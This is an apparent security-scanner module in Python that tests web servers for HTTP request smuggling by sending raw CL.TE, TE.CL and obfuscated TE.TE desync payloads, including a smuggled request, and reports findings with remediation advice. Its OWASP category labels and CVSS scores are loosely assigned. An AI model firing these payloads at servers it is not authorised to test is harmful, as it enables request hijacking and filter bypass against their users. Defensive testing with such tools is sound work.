#!/usr/bin/env python3
"""
HTTP Request Smuggling Tester
------------------------------
CL.TE, TE.CL, TE.TE desync detection via raw sockets.
"""

import socket, ssl, time, re, requests
from urllib.parse import urlparse
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()


class HTTPSmuggling:
    def __init__(self, target: str, session=None, timeout: int = 15):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.session = session or requests.Session()
        parsed = urlparse(self.target)
        self.host = parsed.hostname or "localhost"
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.scheme = parsed.scheme
        self.path = parsed.path or "/"
        self.results: List[Dict] = []

    def _raw_connect(self) -> Optional[socket.socket]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            if self.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            return sock
        except Exception:
            return None

    def _send_raw(self, payload: bytes) -> Optional[str]:
        sock = self._raw_connect()
        if not sock:
            return None
        try:
            sock.sendall(payload)
            time.sleep(0.5)
            data = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 65536:
                        break
                except socket.timeout:
                    break
            return data.decode("utf-8", errors="replace")
        except Exception:
            return None
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _test_cl_te(self) -> Optional[Dict]:
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n\r\nSMUG"
        ).encode()
        t0 = time.time()
        raw = self._send_raw(payload)
        elapsed = time.time() - t0
        if not raw:
            return None
        count = raw.count("HTTP/1.")
        if count >= 2 or elapsed > 8.0:
            return {
                "url": self.target,
                "type": "HTTP Request Smuggling — CL.TE Desync",
                "severity": "critical",
                "cvss": 9.8,
                "technique": "CL.TE",
                "detail": (
                    "Frontend uses Content-Length, backend uses Transfer-Encoding. "
                    "Enables session hijacking, WAF bypass, and request forgery."
                ),
                "evidence": f"Responses: {count}, Elapsed: {elapsed:.2f}s",
                "owasp": "A10:2021 – Server-Side Request Forgery",
                "remediation": (
                    "Reject requests with both Content-Length and Transfer-Encoding. "
                    "Use HTTP/2 end-to-end. Normalize headers at reverse proxy."
                ),
            }
        return None

    def _test_te_cl(self) -> Optional[Dict]:
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\nZ\r\nQ\r\n\r\n"
        ).encode()
        t0 = time.time()
        raw = self._send_raw(payload)
        elapsed = time.time() - t0
        if raw and elapsed > 8.0:
            return {
                "url": self.target,
                "type": "HTTP Request Smuggling — TE.CL Desync",
                "severity": "critical",
                "cvss": 9.3,
                "technique": "TE.CL",
                "detail": "Backend uses Content-Length while frontend uses Transfer-Encoding.",
                "evidence": f"Response hung for {elapsed:.1f}s",
                "owasp": "A10:2021 – Server-Side Request Forgery",
                "remediation": "Standardize body-length parsing across all HTTP layers.",
            }
        return None

    def _test_te_te(self) -> Optional[Dict]:
        for te_val in [
            "chunked, identity",
            "  chunked",
            "CHUNKED",
            "x-custom, chunked",
        ]:
            payload = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: {te_val}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n"
                f"0\r\n\r\n"
            ).encode()
            t0 = time.time()
            raw = self._send_raw(payload)
            elapsed = time.time() - t0
            if raw:
                st = 0
                m = re.match(r"HTTP/[\d.]+ (\d+)", raw)
                if m:
                    st = int(m.group(1))
                if st == 403 or elapsed > 8.0:
                    return {
                        "url": self.target,
                        "type": "HTTP Request Smuggling — TE.TE Obfuscation",
                        "severity": "critical",
                        "cvss": 9.3,
                        "technique": f"TE.TE ({te_val})",
                        "detail": f"Obfuscated TE '{te_val}' triggered desync behaviour (HTTP {st}, {elapsed:.1f}s).",
                        "evidence": f"TE: {te_val} → HTTP {st}",
                        "owasp": "A10:2021 – Server-Side Request Forgery",
                        "remediation": "Reject requests with multiple or malformed Transfer-Encoding headers.",
                    }
        return None

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ HTTP Request Smuggling on {self.target}[/bold yellow]"
        )
        tests = [
            ("CL.TE", self._test_cl_te),
            ("TE.CL", self._test_te_cl),
            ("TE.TE", self._test_te_te),
        ]
        for name, fn in tests:
            console.print(f"  [dim]Testing {name}...[/dim]")
            try:
                r = fn()
                if r:
                    self.results.append(r)
                    console.print(f"  [bold red][!] {r['type']}[/bold red]")
            except Exception as e:
                self.results  # silent
        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} smuggling issue(s) found[/]")
        return self.results
